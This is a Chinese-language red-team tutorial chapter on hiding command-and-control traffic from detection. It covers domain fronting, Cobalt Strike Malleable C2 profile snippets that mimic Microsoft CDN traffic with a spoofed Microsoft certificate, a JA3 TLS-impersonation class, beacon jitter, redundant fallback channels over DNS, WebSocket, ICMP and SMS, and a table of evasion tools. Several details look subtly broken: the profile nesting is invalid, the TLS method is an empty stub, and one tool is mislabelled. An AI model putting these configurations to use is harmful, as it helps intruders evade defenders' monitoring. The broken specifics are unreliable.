# C2 反检测与规避技术

## 概述

C2（Command & Control）是红队行动的心脏。一旦 C2 被检测到，整个行动就暴露了。本章深入 C2 隐避、域前置、CDN 中继等反检测技术。

---

## 1. C2 隐避层次

```
C2 检测逃逸层次:

  L1 网络层 (Network)
    → 流量伪装 (TLS 指纹/时延/包大小)
    → 域前置 (Domain Fronting)
    → CDN 中继

  L2 协议层 (Protocol)
    → 自定义协议 (二进制/Protobuf)
    → 协议嵌入 (DNS/HTTP/HTTPS/WebSocket)
    → 协议轮换

  L3 载荷层 (Payload)
    → 反射加载
    → 进程注入迁移
    → 内存执行

  L4 行为层 (Behavior)
    → 通信时间随机化 (Jitter)
    → 长间隔操作 (Low and Slow)
    → 模拟正常流量模式
```

---

## 2. 域前置 (Domain Fronting)

### 2.1 原理

```
域前置原理:

  正常 CDN 请求:
    客户端 → CDN Edge → Origin (backend.example.com)
              ↑
         SNI: backend.example.com
         Host: backend.example.com

  域前置 (Domain Fronting):
    客户端 → CDN Edge → Origin (backend.example.com)
              ↑                    ↑
         SNI: cdn-front.com     Host: backend.example.com
         (CDN 域名)           (真实目标)

  检测视角:
    - 中间件只看到 SNI → 以为是 cdn-front.com 的流量
    - CDN 内部使用 Host header → 路由到真实 backend
```

### 2.2 Cobalt Strike 域前置配置

```bash
# Cobalt Strike Malleable C2 Profile — 域前置

# profile-fronting.profile
http-get {
    set uri "/api/v2/health";
    client {
        header "Host" "backend.example.com";  # 真实目标
        header "Accept" "application/json";
        metadata {
            base64url;
            prepend "token=";
            header "Authorization";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v2/data";
    client {
        header "Host" "backend.example.com";
        header "Content-Type" "application/json";
    }
}

# DNS 信标 (备信道)
dns-beacon {
    set dns_idle "8.8.8.8";
    set dns_sleep 0;
    set maxdns 255;
    set dns_max_txt 252;
    set dns_ttl 60;
}

# 前端配置
stage {
    set host_stage_url "https://cdn-front.example.com/static/css/style.css";
}
```

---

## 3. C2 流量特征隐藏

### 3.1 TLS 指纹伪装

```python
# TLS 客户端 JA3 指纹修改
# 目标: 模拟 Chrome 浏览器的 TLS 指纹

class JA3Impersonator:
    """
    JA3 指纹计算:
    SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats
    """

    CHROME_JA3 = "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0"

    @staticmethod
    def configure_ssl_context():
        """配置 Python 请求使用 Chrome JA3 指纹"""
        import ssl
        import requests
        from urllib3.poolmanager import PoolManager

        # 使用自定义 SSLContext
        ctx = ssl.create_default_context()

        # 设置 Chrome 使用的密码套件
        ctx.set_ciphers(
            'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:'
            'ECDH+AESGCM:DH+AESGCM:RSA+AESGCM'
        )

        # 禁用压缩 (避免 CRIME 攻击, 但改变指纹)
        ctx.options |= ssl.OP_NO_COMPRESSION

        return ctx

    @staticmethod
    def spoof_tls_with_library():
        """使用 uTLS 库实现完整 JA3 伪装 (Go)"""

        # Go 实现示例 (使用 refraction-networking/utls):
        pass
```

### 3.2 Malleable C2 Profile

```
# Cobalt Strike Malleable C2 Profile 要点

# 1. HTTP 流量伪装
http-config {
    # 伪装为 Microsoft 更新流量
    set headers "Accept,Accept-Encoding,Accept-Language,Cache-Control,Connection,Cookie,Host,Pragma,Upgrade-Insecure-Requests";
    header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    header "Accept-Encoding" "gzip, deflate";
    header "Accept-Language" "en-US,en;q=0.5";
    header "Connection" "keep-alive";
    header "Cache-Control" "no-cache";
    header "Pragma" "no-cache";
    header "Upgrade-Insecure-Requests" "1";

    # 2. 编码配置
    set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

    # 3. 证书配置 (使用合法证书)
    https-certificate {
        set CN       "cdn.microsoft.com";
        set O        "Microsoft Corporation";
        set C        "US";
        set L        "Redmond";
        set ST       "Washington";
        set validity "365";
    }
}

# 4. 时延 (Jitter) 配置
sleeptime 45000;     # 45 秒基础睡眠
jitter    37;         # 37% 随机化 → 28-62 秒范围
```

---

## 4. 多信道冗余

```yaml
C2 冗余信道设计:

  主信道 (HTTPS):
    - 协议: HTTPS (443)
    - 伪装: Microsoft CDN 流量
    - 防御: 域前置 + JA3 伪装

  备信道 1 (DNS):
    - 协议: DNS TXT 查询
    - 触发: HTTPS 信道中断 > 5 分钟
    - 速率: 极慢 (每 30-60 秒一次查询)
    - 限制: 每条 TXT 记录 ≤ 252 字节

  备信道 2 (WebSocket):
    - 协议: WSS (443)
    - 伪装: 协作工具 WebSocket (Slack/Teams)
    - 触发: DNS 信道中断

  备信道 3 (ICMP):
    - 协议: ICMP Echo/Reply (可选: 数据字段)
    - 触发: 网络隔离, 仅允许 ICMP
    - 速率: 每 60 秒一次 ping

  紧急信道 (SMS/Email):
    - 协议: Twilio/SendGrid API
    - 触发: 所有网络信道中断
    - 用途: 仅通知 "上线" / "触发任务"
```

---

## 5. 反检测工具链

| 工具 | 用途 | 成熟度 |
|------|------|--------|
| **Sliver** | C2 框架 (Go) | ★★★★ |
| **Mythic** | C2 框架 (跨平台) | ★★★★ |
| **Cobalt Strike** | C2 框架 (行业标准) | ★★★★★ |
| **Redirector** | 域名前置中间件 | ★★★ |
| **uTLS** | TLS 指纹伪装 | ★★★★ |
| **ScareCrow** | EDR 逃逸 (DLL 侧加载) | ★★★★ |
| **Nighthawk** | Malleable C2 检测 | ★★★ |

---

## 参考资源

- [Cobalt Strike Malleable C2](https://www.cobaltstrike.com/help-malleable-c2)
- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)

---

*上一篇：[C2 框架与基础设施](02-c2-framework.md)*

*下一篇：[域前置与流量伪装](04-domain-fronting.md)*
